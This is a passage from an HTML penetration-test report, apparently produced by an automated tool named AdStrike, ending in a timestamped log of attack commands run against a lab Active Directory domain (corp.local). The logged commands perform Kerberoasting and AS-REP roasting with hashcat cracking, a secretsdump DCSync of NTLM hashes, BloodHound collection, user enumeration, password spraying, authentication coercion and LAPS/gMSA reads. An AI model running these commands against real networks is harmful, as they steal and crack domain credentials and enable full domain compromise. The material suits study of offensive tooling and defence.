&#x27;***&#x27; -d corp.local --shares</td></tr><tr><td class="time-cell">2026-05-20 01:33:27</td><td class="cmd-cell">nxc ldap 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local -M laps</td></tr><tr><td class="time-cell">2026-05-20 01:33:29</td><td class="cmd-cell">nxc winrm 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local</td></tr><tr><td class="time-cell">2026-05-20 01:33:31</td><td class="cmd-cell">nxc winrm DC01.corp.local -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local</td></tr><tr><td class="time-cell">2026-05-20 01:33:32</td><td class="cmd-cell">nxc winrm 192.168.56.0/24 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local</td></tr><tr><td class="time-cell">2026-05-20 01:33:44</td><td class="cmd-cell">PYTHONWARNINGS=ignore faketime &quot;2026-05-20 01:33:49&quot; /home/kali/Pictures/AdStrike/venv/bin/certipy find -u &#x27;tester@corp.local&#x27; -p &#x27;***&#x27; -dc-ip 192.168.56.1 -target dc01.corp.local -target-ip 192.168.56.1 -dc-host dc01.corp.local -ns 192.168.56.1 -dns-tcp -timeout 10 -vulnerable -stdout 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:33:47</td><td class="cmd-cell">smbclient //192.168.56.1/SYSVOL -U &#x27;corp.local\tester%***&#x27; -c &#x27;cd corp.local/scripts; ls&#x27; 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:33:47</td><td class="cmd-cell">/usr/bin/python3 /home/kali/.local/bin/dacledit.py -action read -target-dn DC=corp,DC=local -principal tester &#x27;corp.local/tester:***&#x27; -dc-ip 192.168.56.1</td></tr><tr><td class="time-cell">2026-05-20 01:33:48</td><td class="cmd-cell">smbclient //192.168.56.1/SYSVOL -U &#x27;corp.local\tester%***&#x27; -c &#x27;cd corp.local/scripts; ls&#x27; 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:33:53</td><td class="cmd-cell">env PYTHONNOUSERSITE=1 PYTHONPATH=/usr/lib/python3/dist-packages /usr/bin/python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py corp.local/tester:&#x27;***&#x27; -dc-ip 192.168.56.1 -dc-host dc01.corp.local -request -format hashcat -outputfile /home/kali/Pictures/AdStrike/output/agent_runtime/agent_asrep.txt</td></tr><tr><td class="time-cell">2026-05-20 01:33:54</td><td class="cmd-cell">hashcat -m 18200 /home/kali/Pictures/AdStrike/output/agent_runtime/agent_asrep.txt /usr/share/wordlists/rockyou.txt --force -o /home/kali/Pictures/AdStrike/output/agent_runtime/agent_asrep_cracked.txt -q 2&gt;/dev/null</td></tr><tr><td class="time-cell">2026-05-20 01:33:54</td><td class="cmd-cell">nxc ldap 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local --gmsa</td></tr><tr><td class="time-cell">2026-05-20 01:33:56</td><td class="cmd-cell">env PYTHONNOUSERSITE=1 PYTHONPATH=/usr/lib/python3/dist-packages /usr/bin/python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/tester:&#x27;***&#x27; -dc-ip 192.168.56.1 -dc-host dc01.corp.local -request -outputfile /home/kali/Pictures/AdStrike/output/agent_runtime/agent_kerberoast.txt</td></tr><tr><td class="time-cell">2026-05-20 01:33:57</td><td class="cmd-cell">hashcat -m 13100 /home/kali/Pictures/AdStrike/output/agent_runtime/agent_kerberoast.txt /usr/share/wordlists/rockyou.txt --force -o /home/kali/Pictures/AdStrike/output/agent_runtime/agent_krb_cracked.txt -q 2&gt;/dev/null</td></tr><tr><td class="time-cell">2026-05-20 01:33:58</td><td class="cmd-cell">ADSTRIKE_BH_HOST=dc01.corp.local ADSTRIKE_BH_DOMAIN=corp.local ADSTRIKE_BH_IP=192.168.56.1 /usr/bin/python3 /home/kali/Pictures/AdStrike/output/agent_runtime/adstrike_bloodhound_ipv4.py -u &#x27;tester&#x27; -p &#x27;***&#x27; --auth-method auto -d corp.local -dc dc01.corp.local -gc dc01.corp.local -ns 192.168.56.1 --dns-tcp --dns-timeout 2 --disable-autogc -c All --zip -op /tmp/agent_bloodhound/bh 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:34:00</td><td class="cmd-cell">ADSTRIKE_BH_HOST=dc01.corp.local ADSTRIKE_BH_DOMAIN=corp.local ADSTRIKE_BH_IP=192.168.56.1 /usr/bin/python3 /home/kali/Pictures/AdStrike/output/agent_runtime/adstrike_bloodhound_ipv4.py -u &#x27;tester&#x27; -p &#x27;***&#x27; --auth-method auto -d corp.local -dc dc01.corp.local -gc dc01.corp.local -ns 192.168.56.1 --dns-tcp --dns-timeout 2 --disable-autogc -c DCOnly --zip -op /tmp/agent_bloodhound/bh_dconly 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:34:03</td><td class="cmd-cell">PYTHONNOUSERSITE=1 PYTHONPATH=/usr/lib/python3/dist-packages /usr/bin/python3 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/tester:&#x27;***&#x27;@192.168.56.1 -just-dc-ntlm -outputfile /tmp/agent_dcsync</td></tr><tr><td class="time-cell">2026-05-20 01:34:03</td><td class="cmd-cell">kerbrute userenum --dc 192.168.56.1 --domain corp.local -t 50 --output /tmp/kerbrute_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</td></tr><tr><td class="time-cell">2026-05-20 01:36:04</td><td class="cmd-cell">nxc ldap 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local --pass-pol</td></tr><tr><td class="time-cell">2026-05-20 01:36:06</td><td class="cmd-cell">nxc smb 192.168.56.1 -u /tmp/users.txt -p &#x27;***&#x27; -d corp.local --no-bruteforce --continue-on-success 2&gt;/dev/null | grep &#x27;\[+\]&#x27;</td></tr><tr><td class="time-cell">2026-05-20 01:36:12</td><td class="cmd-cell">nxc smb 192.168.56.1 -d corp.local -u &#x27;WEB01$&#x27; -p web01 --shares</td></tr><tr><td class="time-cell">2026-05-20 01:36:16</td><td class="cmd-cell">nxc smb 192.168.56.1 -d corp.local -u &#x27;DC01$&#x27; -p dc01 --shares</td></tr><tr><td class="time-cell">2026-05-20 01:36:24</td><td class="cmd-cell">timeout 30 /home/kali/Pictures/AdStrike/venv/bin/coercer coerce -l 192.168.56.100 -t 192.168.56.1 --always-continue -u &#x27;tester&#x27; -p &#x27;***&#x27; 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:36:55</td><td class="cmd-cell">nxc smb 192.168.56.0/24 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local --no-bruteforce 2&gt;&amp;1 | grep &#x27;\[+\]&#x27;</td></tr><tr><td class="time-cell">2026-05-20 01:36:59</td><td class="cmd-cell">nxc smb 192.168.56.1/24 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local 2&gt;&amp;1 | grep &#x27;Pwn3d!&#x27;</td></tr><tr><td class="time-cell">2026-05-20 01:37:03</td><td class="cmd-cell">nxc smb 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local --loggedon-users 2&gt;&amp;1</td></tr><tr><td class="time-cell">2026-05-20 01:37:08</td><td class="cmd-cell">nxc ldap 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local 2&gt;&amp;1 | head -5</td></tr><tr><td class="time-cell">2026-05-20 01:37:10</td><td class="cmd-cell">nxc smb 192.168.56.1 -u &#x27;tester&#x27; -p &#x27;***&#x27; -d corp.local -M sccm 2&gt;&amp;1 | head -20</td></tr></table>
+  </div>
+
+</div>
+
+<div class="report-footer">
+  <div style="margin-bottom:6px">
+    Generated by <strong>AdStrike v5.0</strong> &mdash; creator: tmrswrr &mdash;
+    MITRE ATT&amp;CK® is a registered trademark of The MITRE Corporation.
+  </div>
+  <div style="color:#e74c3c;font-weight:600">
+    CONFIDENTIAL &mdash; For authorised use only. Do not distribute without written permission.
+  </div>
+</div>
+
+</body>
+</html>
